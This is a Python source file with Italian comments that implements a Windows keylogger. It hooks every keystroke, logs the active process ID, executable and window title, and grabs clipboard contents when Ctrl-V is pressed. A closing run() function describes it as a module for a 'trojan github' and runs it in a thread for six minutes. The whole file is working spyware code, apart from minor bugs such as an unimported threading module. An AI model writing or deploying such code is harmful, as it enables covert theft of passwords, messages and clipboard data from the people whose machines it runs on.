# key logger

# print come in py 3.5
from __future__ import print_function

# tipi c servirà per poter comunucare con kernel e api dei processi
from ctypes import *
# PythonCOM: un framework per sviluppare applicazioni COM e per utilizzare i componenti COM preesistenti da Python.
import pythoncom
# per gestire gli appunti
import win32clipboard
# per gestire la pressione dei tasti
import pyHook

# per la chiusura
import time

# dichiariamo alcuni oggetti usati di seguito
# gestisce le finestre
user32   = windll.user32
# ci consente di trovare informazioni sui processi tramite il kernel
kernel32 = windll.kernel32
# ci consente di trovare informazioni sui processi tramite l'api dei processi
psapi    = windll.psapi

# inizialmente non avremo selezionatto nessuna finestra
current_window = None

# serve a capire su che processo vengono inseriti i dati catturati
def get_current_process():

    # gestore della finestra su cui si lavora
    hwnd = user32.GetForegroundWindow()

    # cerca l'ID del processo
    # con ctypes ne dichiariamo il tipo
    pid = c_ulong(0)
    # poi lo passiamo a lla funzione che ne cambierà il valore
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # salva l'ID trovato in precedenza
    process_id = "%d" % pid.value

    # otteniamo l'eseguibile
    # ci serve un tipo string_buffer
    executable = create_string_buffer("\x00" * 512)
    # troviamo h_process tramite il PID, quindi deve essere passato alla successiva funzione per ottenere in nome dell'eseguibile
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    # passiamo tuto alla funzione che ne restituirà il nome dell'eseguibile
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # leggiamone il titolo
    # ci serve un tipo string_buffer
    window_title = create_string_buffer("\x00" * 512)
    # altra funzione per avere il titolo
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # stampiamo le informazioni precedentemente raccolte
    print
    print ("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
    print

    # chiudiamo gli handler
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

# funzione che gestisce la pressione dei tasti e il copia e incolla
def KeyStroke(event):
    # prendiamo il valore da globale: a inizio esecuzione è None
    global current_window
    
    # se il processo è diverso lanciamo get_current_process
    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()

    # se è stato premuto un caratte standard lo stampiamo
    if event.Ascii > 32 and event.Ascii < 127:
        print (chr(event.Ascii), end='')
    else:
        # se [Ctrl-V], recupera il valore dagli appunti del sistema
        if event.Key == "V":
            # apre gli appunti
            win32clipboard.OpenClipboard()
            # ne copia il valore sulla variabile
            pasted_value = win32clipboard.GetClipboardData()
            # li chiude
            win32clipboard.CloseClipboard()
            # li stampa
            print ("[PASTE] - %s" % (pasted_value),)
        else:
            print ("[%s]" % event.Key,)

    # passa l'esecuzione al successivi 'hook' registrato
    return True


def main():
    # crea e registra un hookmanager 
    kl         = pyHook.HookManager()
    # all'evento KeyDown chiama KeyStroke
    kl.KeyDown = KeyStroke
    # registra l'hook e fa partite il loop
    kl.HookKeyboard()
    # Un'applicazione che desideri ricevere notifica riguardo agli eventi input globali deve avere un Windows message pump.
    # un modo per ottenerlo è usare il metodo PumpMessages di pythoncom
    pythoncom.PumpMessages()
    # grazie a questo l'input globale può essere gestito da kl.HookKeyboard()
    
def run(**args):
    # dobbiamo dare un tempo finito al modulo per usarlo con il trojan github
    #facciamo partire la thread
    t = threading.Thread(target = main, args =())
    t.start()
    # registriamo per un poco
    time.sleep(360)
    # usciamo
    return
